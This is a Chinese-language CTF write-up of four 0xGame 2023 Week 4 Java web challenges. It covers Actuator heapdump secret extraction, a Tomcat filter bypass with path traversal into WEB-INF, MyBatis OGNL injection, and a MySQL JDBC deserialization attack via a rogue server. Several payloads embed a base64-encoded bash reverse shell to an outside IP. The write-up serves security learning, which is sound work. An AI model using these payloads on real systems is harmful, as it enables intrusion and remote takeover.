<h2 id="week-4-spring">[Week 4] spring</h2>
<p>Hint 1: Spring Actuator</p>
<p>Hint 2: 看看 /actuator/env 再看看 /actuator/heapdump</p>
<p>根据题目提示这里会有信息泄露，于是我上网搜查了一下相关信息，结合提示我们来看一下有哪些敏感信息，首先访问</p>
<h3 id="env-泄露配置信息">env 泄露配置信息</h3>
<p>![image-20231105094132544](0xGame 2023/image-20231105094132544.png)</p>
<p>这里看到了用户名和密码，不过密码不可见，不过这里的用户名提示我们flag就在password，所以我们思路就是想办法得到密码的明文</p>
<h3 id="mappings-泄露路由信息">mappings 泄露路由信息</h3>
<p>![image-20231105094341321](0xGame 2023/image-20231105094341321.png)</p>
<p>访问之后可以看到存在诸多路由信息，我们可以有选择的去读取</p>
<h3 id="heapdump-泄露堆栈信息">heapdump 泄露堆栈信息</h3>
<p>这个在Spring MVC架构中是可用的，会泄露出推栈信息，其中是可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码，但是扫描工具没把它列为扫描端点。</p>
<p>看了一下文章，其中说是要利用一些工具的，地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
<p>这里直接下载jar包，同时确保本地有maven与java1.8以上的环境，直接按如下命令运行即可</p>
<pre><code class="hljs java">java -jar JDumpSpider-<span class="hljs-number">1.1</span>-SNAPSHOT-full.jar heapdump</code></pre>
<p>注意，将所要获取的信息文件放入至于jar同一目录下</p>
<p>![image-20231105100900189](0xGame 2023/image-20231105100900189.png)</p>
<p>如上图，成功得到flag</p>
<p>或者用其它工具比如 Memory Analyze Tool (MAT) 也行，用 MAT 的话查询语句如下</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.util.LinkedHashMap$Entry x <span class="hljs-keyword">WHERE</span>(toString(x.key).<span class="hljs-keyword">contains</span>("app.password"))</code></pre>
<h2 id="week-4-auth_bypass">[Week 4] auth_bypass</h2>
<p>Hint 1: Tomcat Filter 绕过 (网上有类似的文章 也可以自己尝试 fuzz 一些畸形 url 路径)</p>
<p>Hint 2: 题目通过 war 包部署 预期需要 RCE 尝试通过任意文件下载获取更多信息</p>
<p>Hint 3: 利用 WEB-INF 目录</p>
<p>Hint 4: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>看了一眼题目给的附件，源码如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> javax.servlet.*;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span>  {
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> {
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException {
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) req;

        <span class="hljs-keyword">if</span> (request.getRequestURI().contains(<span class="hljs-string">".."</span>)) {
            resp.getWriter().write(<span class="hljs-string">"blacklist"</span>);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">if</span> (request.getRequestURI().startsWith(<span class="hljs-string">"/download"</span>)) {
            resp.getWriter().write(<span class="hljs-string">"unauthorized access"</span>);
        } <span class="hljs-keyword">else</span> {
            chain.doFilter(req, resp);
        }
    }
}</code></pre>
<p>这里主要是限制了<code>..</code>与<code>download</code>防止用户的目录穿越以及限制download路由的访问，接下来看一下另一个文件</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException {

        <span class="hljs-type">String</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getRealPath(<span class="hljs-string">"/assets/"</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">fileNameParameter</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">"filename"</span>);
        <span class="hljs-keyword">if</span> (fileNameParameter != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) fileNameParameter;
            resp.setHeader(<span class="hljs-string">"Content-Disposition"</span>,<span class="hljs-string">"attachment;filename="</span>+fileName);
            <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(currentPath + fileName)) {
                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];
                <span class="hljs-keyword">while</span> (input.read(buffer) != -<span class="hljs-number">1</span>) {
                    resp.getOutputStream().write(buffer);
                }
            }
        } <span class="hljs-keyword">else</span> {
            resp.setContentType(<span class="hljs-string">"text/html"</span>);
            resp.getWriter().write(<span class="hljs-string">"&lt;a href=\"/download?filename=avatar.jpg\"&gt;avatar.jpg&lt;/a&gt;"</span>);
        }
    }
}</code></pre>
<p>靠着GPT分析了一波，这段代码的作用就是获取到服务器上文件的真实路径以及文件名，以供后续的文件下载功能的使用，下载题目提示我们tomact filter绕过，那我们去看看怎么个事儿</p>
<p>这里绕过方式很多种，参考如下文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14801884.html">Java安全之Filter权限绕过</a></p>
<p>![image-20231105102419042](0xGame 2023/image-20231105102419042.png)</p>
<p>如图，这里我将download进行url编码后，这里页面显示成功访问了，不过这里还可以多/绕过，如下图</p>
<p>![image-20231105102608265](0xGame 2023/image-20231105102608265.png)</p>
<p>这里尝试直接读取flag，但依旧是无权访问</p>
<p>![image-20231105102719747](0xGame 2023/image-20231105102719747.png)</p>
<p>接下来也就没思路了，看wp</p>
<p>然后可以通过 <code>//download?filename=avatar.jpg</code> 下载文件, 但是无法读取 <code>/flag</code> (提示 Permission denied), 那么很明显需要 RCE</p>
<p>根据题目描述, 网站使用 war 打包</p>
<p>这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系)</p>
<p>这里浅浅了解一下WEB-INF目录：</p>
<p>WEB-INF 是 Java 的 WEB 应用的安全目录。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。

/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中

/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件

/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。

/WEB-INF/database.properties：数据库配置文件</code></pre>
<p>![image-20231105103345796](0xGame 2023/image-20231105103345796.png)</p>
<p>如图进行访问下载得到文件</p>
<p>![image-20231105103414371](0xGame 2023/image-20231105103414371.png)</p>
<p>这里的内部构造看不太懂，所以靠wp了：</p>
<p>存在 EvilServlet, 映射的路由为 <code>/You_Find_This_Evil_Servlet_a76f02cb8422</code></p>
<p>根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载</p>
<pre><code class="hljs http">//download?filename=../WEB-INF/classes/com/example/demo/EvilServlet.class</code></pre>
<p>下载之后我选择了jdk打开class文件</p>
<pre><code class="hljs java"><span class="hljs-comment">//</span>
<span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="hljs-comment">// (powered by FernFlower decompiler)</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilServlet</span><span class="hljs-params">()</span> {
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">"Evil_Cmd_Arguments_fe37627fed78"</span>);

        <span class="hljs-keyword">try</span> {
            Runtime.getRuntime().exec(cmd);
            resp.getWriter().write(<span class="hljs-string">"success"</span>);
        } <span class="hljs-keyword">catch</span> (Exception var5) {
            resp.getWriter().write(<span class="hljs-string">"error"</span>);
        }

    }
}</code></pre>
<p>这里上述代码提示我们是处理的post请求：doPost</p>
<p>直接 POST 访问 <code>/You_Find_This_Evil_Servlet_a76f02cb8422</code> 传个参就能执行命令</p>
<p>最后因为没有回显, 需要反弹 shell 或者通过 curl + burp collaborator 外带 flag</p>
<p>![image-20231105105149246](0xGame 2023/image-20231105105149246.png)</p>
<p>这里我直接hackbar进行执行了，如下图，但我不理解的是为何/readflag就能读取flag</p>
<p>![image-20231105105139403](0xGame 2023/image-20231105105139403.png)</p>
<p>不过官方wp采用的bp方式，有以下几个注意点：</p>
<p>这里首先得注意传入 Runtime.exec 的命令需要进行一次编码</p>
<p><a target="_blank" rel="noopener" href="https://www.adminxe.com/tools/code.html">https://www.adminxe.com/tools/code.html</a></p>
<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html">https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html</a></p>
<p>具体原因大家可以参考下面两篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243329">https://www.anquanke.com/post/id/243329</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/java-exec-command/">https://y4er.com/posts/java-exec-command/</a></p>
<p>然后 POST 传递命令时得先 urlencode 一次</p>
<h2 id="week-4-yourbatis">[Week 4] YourBatis</h2>
<p>Hint 1: 关注题目名称/描述 以及 pom.xml 中的依赖</p>
<p>Hint 2: SQL 注入不是考点 题目需要 RCE</p>
<p>Hint 3: MyBatis RCE 尝试结合网上的文章构造 Payload</p>
<p>Hint 4: 注意反编译 jar 包的时候请不要使用 jd-gui  尝试使用 jadx-gui 或 IDEA</p>
<p>Hint 5: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>Hint 6: 在进行 RCE 的时候 因为 OGNL 的解析问题 所以最终传入 Runtime.exec() 的命令内不得包含 { 和 }  可以尝试编码绕过</p>
<p>这里让我们关注题目名称，这里我直接搜索了mybatis漏洞，发现有很多相关复现文章，在此之前我们先打开jar包，之后将其中的文件用idea打开</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>
<p>这里让我们关注一下pom.xml，通过这个文件可以查看 jar 包使用的第三方库</p>
<p>这里我感觉重点就是mybatis-spring-boot-starter–版本为2.1.1，于是胡乱搜了一通，发现下面的信息</p>
<p>![image-20231105111503601](0xGame 2023/image-20231105111503601.png)</p>
<p>那这里估计就是跟着现有的漏洞去复现了，加上题目提示我们存在sql注入以及RCE，我们关键词一搜一大把，重点就是找到正确合理的文章了</p>
<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1227.html">Mybatis 从SQL注入到OGNL注入</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1749">从一道CTF题浅谈MyBatis与Ognl的那些事</a></p>
<p>UserSqlProvider</p>
<pre><code class="hljs java"><span class="hljs-comment">//</span>
<span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="hljs-comment">// (powered by FernFlower decompiler)</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">package</span> com.example.yourbatis.provider;

<span class="hljs-keyword">import</span> org.apache.ibatis.jdbc.SQL;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSqlProvider</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserSqlProvider</span><span class="hljs-params">()</span> {
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUsers</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() {
            {
                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">"*"</span>);
                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">"users"</span>);
            }
        }).toString();
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUserByUsername</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String username)</span> {
        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() {
            {
                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">"*"</span>);
                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">"users"</span>);
                <span class="hljs-built_in">this</span>.WHERE(String.format(<span class="hljs-string">"username = '%s'"</span>, username));
            }
        }).toString();
    }
}</code></pre>
<p>这里显示了查询的sql语句，重点在最后一个方法：select * from users where…，这里估计就是漏洞注入点了</p>
<p>看了看文章，感觉payload格式应该是这样：</p>
<pre><code class="hljs plaintext">${RCE}</code></pre>
<p>但不了解java的rce的代码，只能看wp了：</p>
<pre><code class="hljs java">${<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime()</span>.exec(<span class="hljs-string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"</span>)}</code></pre>
<p>但是很显然是会失败的, 因为传入的命令包含了 <code>{</code> 和 <code>}</code>, 会被递归解析为另一个 OGNL 表达式的开头和结尾</p>
<p>这个点可能比较难, 所以后面给出了 hint</p>
<p>解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法</p>
<p>这里要将<code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}</code>进行base64编码</p>
<pre><code class="hljs java">${<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime()</span>.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-meta">@java</span>.util.Base64<span class="hljs-meta">@getDecoder()</span>.decode(<span class="hljs-string">'YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TWpRdU1qSXdMakl6TXk0eU5pODFOVFUxSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ=='</span>)))}</code></pre>
<p>![image-20231105113238166](0xGame 2023/image-20231105113238166.png)</p>
<p>如上图，拿到flag</p>
<h2 id="week-4-testconnection">[Week 4] TestConnection</h2>
<p>Hint 1: JDBC 会不会存在一些漏洞?</p>
<p>Hint 2: MySQL / PostgreSQL Jdbc Attack</p>
<p>Hint 3: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>这里似乎考的就是MySQL / PostgreSQL Jdbc Attack 了，下面跟着wp复现</p>
<pre><code class="hljs plaintext">JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问

JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value`

db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite

db-name 是要使用的数据库名

param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等

当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE</code></pre>
<p>参考文章:</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
<p>在pom.xml中看到两个依赖：mysql与postgresql</p>
<p>![image-20231105153731477](0xGame 2023/image-20231105153731477.png)</p>
<p>给了两个依赖, mysql 和 postgresql, 对应两种利用方式</p>
<p>然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload</p>
<p>首先是 mysql 驱动的利用</p>
<p>结合网上文章可以构造对应的 jdbc url：</p>
<pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></code></pre>
<p>首先得注意, 因为题目给的代码是 <code>DriverManager.getConnection(url, username, password);</code>, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p>
<p>网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了</p>
<p>其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p>
<p>最后依然是 Runtime.exec 命令编码的问题</p>
<p>一些 mysql jdbc 利用工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p>
<p>payload</p>
<pre><code class="hljs java">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql:<span class="hljs-comment">//vps-ip:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&amp;password=123</span></code></pre>
<p>url 编码</p>
<pre><code class="hljs http">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%31%32%34%2e%32%32%30%2e%32%33%33%2e%32%36%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&amp;username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%51%75%4d%6a%49%77%4c%6a%49%7a%4d%79%34%79%4e%69%38%31%4e%54%55%31%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&amp;password=123</code></pre>
<p>这里尝试了老多次了，我感觉就是需要有一个公网ip来开启mysql服务，如下图，随后bp发包去发送恶意命令进行RCE</p>
<p>![image-20231105164759475](0xGame 2023/image-20231105164759475.png)</p>
<p>如上图，证明发送成功</p>
<p>![image-20231105164923715](0xGame 2023/image-20231105164923715.png)</p>
<p>最后在env中可以看到flag</p>
<p>![image-20231105164747944](0xGame 2023/image-20231105164747944.png)</p>
<h1 id="0x02-后记">0x02 后记</h1>
<p>终于复现完了，虽然感觉做题体验感不好，但出的题真的有水平啊（因为全不会，新生赛就这么高强度？？？？</p>
<p>总的来说，很多知识点都没见过，就这四周的知识点就够我学一阵儿了，同时我依旧困惑于如何去学习提高代码水平，感觉目前的自己就是exp不会，脚本不会，审计代码也很有难度。真的全是bug┭┮﹏┭┮，感觉似乎要认真地重新学学代码了</p>
<h1 id="0x03-参考文章">0x03 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/#testconnection">0xGame 2023 Web Official Writeup</a> --官方wp</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56426046/article/details/127264705?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-127264705.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">php is_numeric函数的绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huangyongkang666/article/details/123880442?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169796116116800227493577%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169796116116800227493577&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-123880442-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">常见php函数绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51183537/article/details/121140942?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=is_numeric%E7%BB%95%E8%BF%87&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-121140942.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">[CTF]php is_numeric与弱等于(==)绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854662/article/details/125738844?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-125738844.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">常见的Web源码泄漏漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/others/234266.html">Spring Boot Actuator 漏洞利用</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9763">Spring Boot Actuator 未授权的测试与利用思路</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/17051019.html">Java安全之JDBC Attacks</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">Java JDBC </a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 